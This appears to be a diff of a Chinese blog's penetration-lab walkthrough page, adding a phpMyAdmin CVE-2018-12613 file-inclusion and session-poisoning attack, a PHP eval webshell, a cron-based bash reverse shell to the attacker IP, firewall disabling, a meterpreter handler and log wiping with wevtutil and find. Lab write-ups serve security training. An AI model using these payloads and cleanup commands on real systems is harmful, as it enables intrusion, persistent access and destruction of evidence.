@@ -30,7 +30,7 @@
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="http://example.com/images/redefine-og.webp">
 <meta property="article:published_time" content="2025-06-04T08:07:05.000Z">
-<meta property="article:modified_time" content="2025-06-04T10:01:09.844Z">
+<meta property="article:modified_time" content="2025-06-04T11:12:00.059Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="靶场">
 <meta name="twitter:card" content="summary">
@@ -396,8 +396,8 @@
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2025-06-04 18:01:09</span>
-            <span class="mobile">2025-06-04 18:01:09</span>
+            <span class="desktop">2025-06-04 19:12</span>
+            <span class="mobile">2025-06-04 19:12</span>
             <span class="hover-info">Updated</span>
         </span>
     
@@ -435,12 +435,12 @@
     
     
         <span class="article-wordcount article-meta-item">
-            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>3.3k Words</span>
+            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>3.8k Words</span>
         </span>
     
     
         <span class="article-min2read article-meta-item">
-            <i class="fa-regular fa-clock"></i>&nbsp;<span>14 Mins</span>
+            <i class="fa-regular fa-clock"></i>&nbsp;<span>17 Mins</span>
         </span>
     
     
@@ -466,7 +466,7 @@
 <div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">web主机双网卡 内网ip：192.168.183.129  公网ip：192.168.86.131</span><br><span class="line">dc主机：内网ip：192.168.183.130</span><br><span class="line">win7主机：内网ip：192.168.183.128</span><br><span class="line">攻击机kali ip：192.168.86.132</span><br></pre></td></tr></table></figure></div>
 
 <p>web主机启动服务</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo su</span><br><span class="line">docker start ec 17 09</span><br><span class="line">docker ps</span><br></pre></td></tr></table></figure></div>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo su</span><br><span class="line">docker start ec 17 09 ad</span><br><span class="line">docker ps</span><br></pre></td></tr></table></figure></div>
 
 <p><img  
                      lazyload
@@ -583,7 +583,7 @@
                      data-src="/./../images/image-20250603002404382.png"
                       alt="image-20250603002404382"
                 ></p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">设置一下相关参数</span><br><span class="line">set rhost 192.168.86.133(换了地方打，ip发生了变换)</span><br><span class="line">set rport 2002</span><br></pre></td></tr></table></figure></div>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">设置一下相关参数</span><br><span class="line">set rhost 192.168.86.137(换了地方打，ip发生了变换)</span><br><span class="line">set rport 2002</span><br></pre></td></tr></table></figure></div>
 
 <p><img  
                      lazyload
@@ -593,7 +593,71 @@
                 ></p>
 <p>成功弹回shell</p>
 <p>不用msf集成模块打的话就用抓包改get方式为put方式传jsp马，可以文件流绕过，可以空格绕过，可以”&#x2F;“绕过，我用”&#x2F;“绕过上去用webshell连接即可</p>
-<p>因为前文提到我们拿到的shell是处于docker环境中的</p>
+<p>再看一下2003端口</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../images/image-20250604182131936.png"
+                      alt="image-20250604182131936"
+                ></p>
+<p>右下角泄露版本</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../images/image-20250604182225770.png"
+                      alt="image-20250604182225770"
+                ></p>
+<p>查一下相关版本，参考链接</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43263451/article/details/124229466" >phpMyAdmin另一种getshell姿势(CVE-2018-12613)_phpmyadmin rce-CSDN博客<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<p>版本 4.8.1 存在 CVE-2018-12613 远程文件包含，payload</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?target=tbl_zoom_select.php?/../../../../../../etc/hosts</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../images/image-20250604182618022.png"
+                      alt="image-20250604182618022"
+                ></p>
+<p>因此利用 session 写入 shell 的方式进行 getshell<br>原理:<br>Http 协议是一种无状态协议，即每次服务端接收到客户端的请求时，都是一个全新的请求，服务器并不知道客户端的历史请求记录；</p>
+<p>Session 的主要目的就是为了弥补 Http 的无状态特性。简单的说，就是服务器可以利用 session 存储客户端在同一个会话期间的一些操作记录；</p>
+<p>因此这里相对应的 sql 的查询历史也会出现在 session 中，若是一句话木马出现在 session 中，那么就可以使用远程文件包含取得 shell 了。</p>
+<p>session 常见的一些保存路径</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/var/lib/php/sess_PHPSESSID</span><br><span class="line">/var/lib/php/sessions/sess_PHPSESSID</span><br><span class="line">/tmp/sess_PHPSESSID</span><br><span class="line">/tmp/sessions/sess_PHPSESSID</span><br></pre></td></tr></table></figure></div>
+
+<p><code>session</code> 文件的存储路径是分为两种情况的</p>
+<p>一是没有权限，默认存储在 <code>/var/lib/php/sessions/</code> 目录下，文件名为 <code>sess_[phpsessid]</code>，而 <code>phpsessid</code> 在发送的请求的 <code>cookie</code> 字段中可以看到（一般在利用漏洞时我们自己设置 <code>phpsessid</code>）</p>
+<p>二是 <code>phpmyadmin</code>，这时的 <code>session</code> 文件存储在 <code>/tmp</code> 目录下，需要在 <code>php.ini</code> 里把 <code>session.auto_start</code> 置为 1，把 <code>session.save_path</code> 目录设置为 <code>/tmp</code></p>
+<p>直接执行 </p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT &quot;&lt;?php phpinfo();?&gt;&quot;</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../images/image-20250604183014803.png"
+                      alt="image-20250604183014803"
+                ></p>
+<p>payload</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?target=tbl_zoom_select.php?/../../../../../../tmp/sess_002ae7a61eb8335555c2a4cd34d9f1e8</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../images/image-20250604183112488.png"
+                      alt="image-20250604183112488"
+                ></p>
+<p>接着使用文件包含将一句话木马写到网站目录下，尝试过将一句话木马直接写在包含文件中是不可以进行连接的。毕竟只是包含并不是真正的接收参数的页面</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &quot;&lt;?php file_put_contents(&#x27;/var/www/html/cmd.php&#x27;,&#x27;&lt;?php @eval($_POST[pass]);?&gt;&#x27;)?&gt;&quot;</span><br></pre></td></tr></table></figure></div>
+
+<p>访问根目录的cmd.php</p>
+<p>蚂蚁剑连接</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../images/image-20250604190942164.png"
+                      alt="image-20250604190942164"
+                ></p>
+<p>这里由于 docker 环境缺少太多必要的东西导致无法成功逃逸，并且提取成功无法切换用户</p>
+<p>因为前文提到我们拿到的(tomcat)shell是处于docker环境中的</p>
 <p>执行</p>
 <div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/1/cgroup</span><br></pre></td></tr></table></figure></div>
 
@@ -645,7 +709,7 @@
 <div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chroot /test</span><br></pre></td></tr></table></figure></div>
 
 <p>写一个计划任务将shell弹回到kali机器上</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">touch /test/test3.sh</span><br><span class="line">echo &quot;bash -i &gt;&amp; /dev/tcp/192.168.86.132/7777 0&gt;&amp;1&quot; &gt;/test/test3.sh</span><br><span class="line">echo &quot;* * * * * root bash /test3.sh&quot; &gt;&gt; /test/etc/crontab</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">touch /test/test3.sh</span><br><span class="line">echo &quot;bash -i &gt;&amp; /dev/tcp/192.168.86.138/7777 0&gt;&amp;1&quot; &gt;/test/test4.sh</span><br><span class="line">echo &quot;* * * * * root bash /test4.sh&quot; &gt;&gt; /test/etc/crontab</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
 
 <p><img  
                      lazyload
@@ -1080,13 +1144,23 @@
                 ></p>
 <div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy shell.exe \\WIN-ENS2VR5TR3N\c$</span><br></pre></td></tr></table></figure></div>
 
-<p>利用sc关闭防火墙，并执行shell.exe后门</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sc \\WIN-ENS2VR5TR3N create ProFirewall binpath= &quot;netsh advfirewall set allprofiles state off&quot; </span><br><span class="line">sc \\WIN-ENS2VR5TR3N start ProFirewall </span><br><span class="line">sc \\WIN-ENS2VR5TR3N create Startup binpath= &quot;C:\shell.exe&quot; </span><br><span class="line">sc \\WIN-ENS2VR5TR3N start Startup</span><br></pre></td></tr></table></figure></div>
+<p>使用 <code>netsh</code> 命令关闭防火墙，并执行dc_shell.exe后门</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall set allprofiles state off</span><br><span class="line">dc_shell.exe</span><br></pre></td></tr></table></figure></div>
 
 <p>msf监听</p>
 <div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp</span><br><span class="line">set RHOST 192.168.183.130</span><br><span class="line">set LPORT 3333</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure></div>
 
 <p>最后域控 192.168.183.130 上线。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../images/image-20250604181753732.png"
+                      alt="image-20250604181753732"
+                ></p>
+<p>痕迹清理</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">主要是将两台Windows主机的日志清除，ubuntu主机的上传文件、webshell删除</span><br><span class="line">wevtutil cl system</span><br><span class="line"></span><br><span class="line">wevtutil cl security</span><br><span class="line"></span><br><span class="line">wevtutil cl setup</span><br><span class="line"></span><br><span class="line">wevtutil cl application</span><br><span class="line"></span><br><span class="line">接下来在web主机查找日志文件并批量删除</span><br><span class="line">find / -name *.log -exec rm -rf &#123;&#125; \;</span><br><span class="line">find / -name *.log -exec rm &#123;&#125; \;</span><br></pre></td></tr></table></figure></div>
+
+<p><del>渗透测试结束，系统十分安全</del></p>
 
 		</div>
 
@@ -1101,7 +1175,7 @@
         
             <li>
                 <strong>Updated at
-                    :</strong> 2025-06-04 18:01:09
+                    :</strong> 2025-06-04 19:12:00
             </li>
         
         <li>
@@ -1197,7 +1271,7 @@
                     </span>
                     
                         <span>
-                            24.9k words in total
+                            25.4k words in total
                         </span>
                     
                 </p>
